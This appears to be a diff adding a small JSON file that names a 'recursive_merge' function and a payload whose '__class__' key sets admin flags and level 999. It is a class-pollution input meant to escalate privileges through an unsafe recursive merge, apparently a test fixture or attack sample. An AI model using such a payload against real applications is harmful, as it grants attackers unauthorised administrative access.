@@ -1,0 +1,10 @@
+{
+  "merge_fn": "recursive_merge",
+  "payload": {
+    "__class__": {
+      "admin": 1,
+      "level": 999,
+      "is_admin": 1
+    }
+  }
+}
